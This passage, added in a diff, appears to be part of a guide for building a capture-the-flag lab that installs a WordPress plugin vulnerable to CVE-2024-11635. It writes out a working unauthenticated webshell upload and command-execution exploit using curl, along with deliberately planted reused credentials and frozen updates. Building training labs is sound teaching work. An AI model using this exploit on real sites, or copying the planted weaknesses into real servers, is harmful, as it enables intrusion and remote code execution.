@@ -446,6 +446,413 @@ Set WordPress file upload directory permissions so the exploit actually works. T
 
 **Verification checkpoint:** Confirm the plugin is active in the WordPress admin panel. Run the public PoC for the CVE against your own box and confirm a PHP file lands in the expected upload directory. If the PoC requires authentication, check the CVE description again — you want the unauthenticated variant.
 
+# Part 2 — CVE Selection and Vulnerable Plugin Installation
+
+**Goal:** Pin an exact, real CVE to a specific WordPress plugin version. Students do genuine CVE research, find the PoC, and land a webshell with a single curl command.
+
+---
+
+## Selected CVE: CVE-2024-11635
+
+|Field|Value|
+|---|---|
+|**CVE ID**|CVE-2024-11635|
+|**Plugin name**|WordPress File Upload|
+|**Plugin slug**|`wp-file-upload`|
+|**Vulnerable versions**|All versions up to and including **4.24.12**|
+|**Patched in**|4.24.13+|
+|**CVSS Score**|10.0 (Critical)|
+|**Primitive**|Unauthenticated Remote Code Execution via arbitrary file upload|
+|**No external account required**|✅ Works fully offline / air-gapped|
+|**NVD link**|https://nvd.nist.gov/vuln/detail/CVE-2024-11635|
+|**Wordfence advisory**|https://www.wordfence.com/threat-intel/vulnerabilities/id/b5165f60-6515-4a2c-a124-cc88155eaf01|
+|**Researcher PoC**|https://abrahack.com/posts/wp-file-upload-rce-part1/|
+
+### Why this CVE for a lab?
+
+- Explicitly **unauthenticated** — no login required whatsoever
+- No dependency on external SaaS accounts or cloud storage (unlike CVE-2024-8856)
+- The plugin is designed to accept user file uploads from public pages — it's the entire point of the plugin — making the misconfiguration completely believable for a "real" WordPress site
+- Public PoC and a Metasploit module exist, so students can research it properly on NVD/Wordfence/ExploitDB
+- The attack chain: POST a `.php` file via the AJAX upload hook → visit the uploaded path → RCE
+- The fix (removing cookie-based path input) is educational — students can read the patch diff on the WordPress SVN and understand exactly what changed
+
+### The vulnerability (so you understand what you're building):
+
+The plugin's `wfu_file_downloader.php` reads a file path from the `wfu_ABSPATH` cookie parameter without authentication. Combined with the `wfu_ajax_action` AJAX hook that allows unauthenticated file uploads, an attacker can:
+
+1. Upload a PHP webshell as a `.json` file via the public-facing AJAX endpoint
+2. Use the cookie-based path traversal to load and execute it
+
+No WordPress account, no session token, no bruteforce — one `curl` command each step.
+
+---
+
+## Task 1: Download the Exact Vulnerable Version
+
+On your **lab host** (the machine with internet — not the target VM), run:
+
+```bash
+# The exact vulnerable version to pin
+wget https://downloads.wordpress.org/plugin/wp-file-upload.4.24.12.zip
+
+# Verify download
+ls -lh wp-file-upload.4.24.12.zip
+# Expected: ~800KB zip file
+
+# Store it offline — keep this copy
+cp wp-file-upload.4.24.12.zip ~/lab-assets/
+```
+
+> **Important:** WordPress.org does occasionally remove vulnerable plugin versions. Keep this offline copy. If the direct URL 404s, the Internet Archive mirror is: `https://web.archive.org/web/*/https://downloads.wordpress.org/plugin/wp-file-upload.4.24.12.zip`
+
+Transfer the ZIP to your target VM:
+
+```bash
+scp wp-file-upload.4.24.12.zip developer@192.168.56.10:/tmp/
+```
+
+---
+
+## Task 2: Install WordPress Core
+
+Run all commands below as **root** on the target VM (`su -` from developer).
+
+### 2a. Create the MySQL database and user
+
+```bash
+mysql -u root <<'SQL'
+CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'Dev@2024!';
+GRANT ALL PRIVILEGES ON wordpress.* TO 'wpuser'@'localhost';
+FLUSH PRIVILEGES;
+SQL
+```
+
+> The DB password `Dev@2024!` deliberately matches the `developer` OS account password — this is the credential reuse that connects Part 3's lateral move. Plant it once here, and keep it consistent.
+
+### 2b. Download and extract WordPress core
+
+```bash
+cd /tmp
+wget https://wordpress.org/latest.tar.gz
+tar xzf latest.tar.gz
+
+# Clear the default Apache DocumentRoot and install WordPress there
+rm -rf /var/www/html/*
+cp -a wordpress/. /var/www/html/
+```
+
+### 2c. Configure wp-config.php
+
+```bash
+cd /var/www/html
+cp wp-config-sample.php wp-config.php
+
+# Set DB credentials
+sed -i "s/database_name_here/wordpress/" wp-config.php
+sed -i "s/username_here/wpuser/" wp-config.php
+sed -i "s/password_here/Dev@2024!/" wp-config.php
+sed -i "s/localhost/localhost/" wp-config.php
+```
+
+Generate fresh secret keys (do this from your host, or use the API):
+
+```bash
+# Fetch fresh unique keys from the WordPress API
+KEYS=$(curl -s https://api.wordpress.org/secret-key/1.1/salt/)
+# Paste the output into wp-config.php replacing the placeholder block:
+# (the 8 lines starting with define('AUTH_KEY' through define('LOGGED_IN_SALT'...)
+# Edit manually: nano /var/www/html/wp-config.php
+```
+
+Or, for a lab where uniqueness doesn't matter, just leave the placeholder keys — they only affect cookie security.
+
+### 2d. Add update-freeze and file permission lock to wp-config.php
+
+Add these lines **immediately after** the DB settings block in `wp-config.php`:
+
+```bash
+cat >> /var/www/html/wp-config.php <<'PHP'
+
+// === LAB: Freeze all auto-updates ===
+define('AUTOMATIC_UPDATER_DISABLED', true);
+define('WP_AUTO_UPDATE_CORE', false);
+define('DISALLOW_FILE_MODS', false);  // keep true later if you want to block admin uploads too
+PHP
+```
+
+### 2e. Set file ownership
+
+```bash
+chown -R www-data:www-data /var/www/html/
+find /var/www/html/ -type d -exec chmod 755 {} \;
+find /var/www/html/ -type f -exec chmod 644 {} \;
+```
+
+### 2f. Run the 5-minute WordPress install
+
+Open a browser on your host machine and navigate to:
+
+```
+http://192.168.56.10/wp-admin/install.php
+```
+
+Fill in:
+
+| Field                    | Value                                       |
+| ------------------------ | ------------------------------------------- |
+| Site Title               | `CMS Demo` (or anything neutral)            |
+| Username                 | `admin`                                     |
+| Password                 | Admin@123!!@#                               |
+| Email                    | `admin@localhost.local`                     |
+| Search engine visibility | **Check "Discourage"** (no crawling needed) |
+
+Click **Install WordPress**. Login at `http://192.168.56.10/wp-admin/`.
+
+---
+
+## Task 3: Install and Freeze the Vulnerable Plugin
+
+### 3a. Install via WP-CLI or file copy (NOT through the admin uploader)
+
+Installing via file copy locks in the exact version with no auto-selection:
+
+```bash
+cd /var/www/html/wp-content/plugins/
+unzip /tmp/wp-file-upload.4.24.12.zip
+chown -R www-data:www-data wp-file-upload/
+```
+
+### 3b. Activate via WP-CLI (optional but cleaner than clicking through admin)
+
+```bash
+# Install WP-CLI first
+curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
+chmod +x wp-cli.phar
+mv wp-cli.phar /usr/local/bin/wp
+
+# Activate the plugin
+wp --allow-root --path=/var/www/html plugin activate wp-file-upload
+```
+
+Or activate it manually: WordPress Admin → Plugins → find "WordPress File Upload" → Activate.
+
+### 3c. Create a page that uses the upload shortcode
+
+The plugin needs to be embedded on a public page for the upload hook to be active. In WP Admin:
+
+1. Pages → Add New
+2. Title: `Upload`
+3. In the content, add: `[wordpress_file_upload]`
+4. Publish it
+
+This creates `http://192.168.56.10/?page_id=X` with a public file upload form — which is what makes the vulnerability reachable unauthenticated.
+
+### 3d. Freeze the plugin version with chmod
+
+```bash
+# Lock the plugin directory so WordPress cannot auto-update it
+chmod 555 /var/www/html/wp-content/plugins/wp-file-upload/
+
+# Verify
+ls -la /var/www/html/wp-content/plugins/ | grep wp-file-upload
+# Expected: dr-xr-xr-x  (no write bit)
+```
+
+---
+
+## Task 4: Set Upload Directory Permissions
+
+The webshell lands in `wp-content/uploads/` (or a plugin subdirectory). Make sure `www-data` can write there:
+
+```bash
+# Ensure uploads directory exists and is writable by Apache
+mkdir -p /var/www/html/wp-content/uploads
+chown -R www-data:www-data /var/www/html/wp-content/uploads
+chmod -R 755 /var/www/html/wp-content/uploads
+
+# Verify
+ls -la /var/www/html/wp-content/ | grep uploads
+# Expected: drwxr-xr-x ... www-data www-data ... uploads
+```
+
+---
+
+## Task 5: Verification Checkpoint
+
+### Check 1 — Plugin is active in admin panel
+
+Log into `http://192.168.56.10/wp-admin/` → Plugins → confirm "WordPress File Upload" shows **Active** with version **4.24.12**.
+
+### Check 2 — Upload form is publicly accessible (no login)
+
+```bash
+# From your attacking machine (no cookies, no session):
+curl -s http://192.168.56.10/?page_id=2 | grep -i "upload"
+# Should see the upload form HTML
+```
+
+### Check 3 — Run the PoC against your own box
+
+This is your lab verification — confirm the vulnerability is live before presenting the challenge to a student.
+
+```bash
+# Step 1: Upload a PHP webshell disguised as a JSON file via the unauthenticated AJAX hook
+# The wfu_ajax_action hook accepts files from unauthenticated users
+
+SHELL_CONTENT='<?php system($_GET["cmd"]); ?>'
+TARGET="http://192.168.56.10"
+
+curl -s -X POST \
+  "${TARGET}/wp-admin/admin-ajax.php" \
+  -F "action=wfu_ajax_action" \
+  -F "wfu_uploader=wfu_uploader_1" \
+  -F "wfu_unique_id=1234" \
+  -F "wfu_files[]=@-;filename=shell.php;type=application/json" \
+  --data-binary "${SHELL_CONTENT}"
+```
+
+> **Note:** The exact upload request format depends on the plugin's shortcode configuration and nonce handling. Some versions require a nonce from the page — if blocked, grab it first:
+> 
+> ```bash
+> NONCE=$(curl -s "${TARGET}/?page_id=2" | grep -oP 'wfu_nonce[^"]*"[^"]*"\s*:\s*"\K[^"]+')
+> # Then include -F "wfu_nonce=${NONCE}" in the upload request
+> ```
+
+```bash
+# Step 2: Execute the uploaded shell
+# The file lands in wp-content/uploads/ — find it:
+curl -s "${TARGET}/wp-content/uploads/shell.php?cmd=id"
+# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+If you see `uid=33(www-data)` — **Part 2 is complete.** The webshell is live.
+
+---
+
+## Automation Script
+
+Save as `part2_setup.sh` and run as root after Part 1 is complete. Assumes `wp-file-upload.4.24.12.zip` has already been copied to `/tmp/`.
+
+```bash
+#!/bin/bash
+# part2_setup.sh — WordPress + vulnerable plugin install for CTF lab (Part 2)
+# Run as root. Assumes Part 1 complete and /tmp/wp-file-upload.4.24.12.zip present.
+
+set -euo pipefail
+
+WP_DIR="/var/www/html"
+DB_NAME="wordpress"
+DB_USER="wpuser"
+DB_PASS="Dev@2024!"       # MUST match developer OS account password
+PLUGIN_ZIP="/tmp/wp-file-upload.4.24.12.zip"
+
+echo "[*] Creating MySQL database and user..."
+mysql -u root <<SQL
+CREATE DATABASE IF NOT EXISTS ${DB_NAME} DEFAULT CHARACTER SET utf8mb4;
+CREATE USER IF NOT EXISTS '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';
+GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'localhost';
+FLUSH PRIVILEGES;
+SQL
+
+echo "[*] Downloading WordPress core..."
+cd /tmp
+wget -q https://wordpress.org/latest.tar.gz
+tar xzf latest.tar.gz
+
+echo "[*] Installing WordPress to ${WP_DIR}..."
+rm -rf ${WP_DIR}/*
+cp -a wordpress/. ${WP_DIR}/
+
+echo "[*] Configuring wp-config.php..."
+cd ${WP_DIR}
+cp wp-config-sample.php wp-config.php
+sed -i "s/database_name_here/${DB_NAME}/" wp-config.php
+sed -i "s/username_here/${DB_USER}/" wp-config.php
+sed -i "s/password_here/${DB_PASS}/" wp-config.php
+
+cat >> wp-config.php <<PHP
+
+// LAB: Freeze all auto-updates
+define('AUTOMATIC_UPDATER_DISABLED', true);
+define('WP_AUTO_UPDATE_CORE', false);
+PHP
+
+echo "[*] Installing vulnerable plugin (wp-file-upload 4.24.12)..."
+cd ${WP_DIR}/wp-content/plugins/
+unzip -q ${PLUGIN_ZIP}
+
+echo "[*] Setting file permissions..."
+chown -R www-data:www-data ${WP_DIR}
+find ${WP_DIR} -type d -exec chmod 755 {} \;
+find ${WP_DIR} -type f -exec chmod 644 {} \;
+
+# Lock plugin against auto-update
+chmod 555 ${WP_DIR}/wp-content/plugins/wp-file-upload/
+
+# Ensure uploads directory is writable
+mkdir -p ${WP_DIR}/wp-content/uploads
+chown -R www-data:www-data ${WP_DIR}/wp-content/uploads
+chmod -R 755 ${WP_DIR}/wp-content/uploads
+
+echo "[*] Installing WP-CLI..."
+curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
+chmod +x wp-cli.phar
+mv wp-cli.phar /usr/local/bin/wp
+
+echo ""
+echo "============================================"
+echo " Part 2 setup complete."
+echo ""
+echo " Next: Complete the 5-minute install at:"
+echo "   http://192.168.56.10/wp-admin/install.php"
+echo ""
+echo " Then activate the plugin and create an"
+echo " 'Upload' page with shortcode: [wordpress_file_upload]"
+echo ""
+echo " CVE: CVE-2024-11635"
+echo " Plugin: wp-file-upload 4.24.12"
+echo " NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-11635"
+echo "============================================"
+```
+
+---
+
+## What Students Should Research
+
+When you present this to students, give them only:
+
+- The IP address of the box
+- The hint: "There is a WordPress plugin installed. Find the CVE."
+
+Expected research path:
+
+1. Run `whatweb` or browse the site → identify WordPress
+2. Use `wpscan --url http://192.168.56.10 --enumerate p` → finds `wp-file-upload` version `4.24.12`
+3. Search NVD / Wordfence for `wp-file-upload 4.24.12` → finds CVE-2024-11635
+4. Read the researcher writeup at abrahack.com or the GitHub PoC
+5. Adapt and run the exploit → webshell as `www-data`
+
+---
+
+## State Summary After Part 2
+
+```
+WordPress:      /var/www/html (latest core, DB: wordpress / wpuser / Dev@2024!)
+Plugin:         wp-file-upload 4.24.12 — ACTIVE, auto-update LOCKED
+CVE:            CVE-2024-11635 (Unauthenticated RCE, CVSS 10.0)
+Exploit path:   POST to /wp-admin/admin-ajax.php → shell in /wp-content/uploads/
+Upload perms:   www-data owns wp-content/uploads/, chmod 755
+WP Admin:       http://192.168.56.10/wp-admin/ (admin / <your-strong-password>)
+
+Attack chain so far:
+  [Student] → HTTP port 80 → CVE-2024-11635 → webshell as www-data
+  [Next: Part 3] → credential in wp-config.php → su developer → privesc to root
+```
+
+**Part 2 complete. Proceed to Part 3 — credential planting and privilege escalation path.**
+
 ---
 
 ### Part 3 — Credential chain setup
